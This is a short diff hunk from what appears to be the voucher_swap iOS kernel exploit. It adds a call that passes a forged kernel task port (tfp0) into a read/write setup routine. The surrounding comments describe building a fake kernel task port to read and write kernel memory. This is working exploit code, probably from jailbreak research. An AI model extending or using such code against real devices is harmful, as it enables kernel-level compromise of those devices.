@@ -1118,6 +1118,8 @@ voucher_swap() {
 
 	// 26. Build a fake kernel task port that allows us to read and write kernel memory.
 	stage2_init(ipc_space_kernel, kernel_map);
+    extern void prepare_for_rw_with_fake_tfp0(mach_port_t fake_tfp0);;
+    prepare_for_rw_with_fake_tfp0(kernel_task_port);
 
 	// 27. Alright, now kernel_read() and kernel_write() should work, so let's build a safer
 	// kernel_task port. This also cleans up fake_port so that we (hopefully) won't panic on
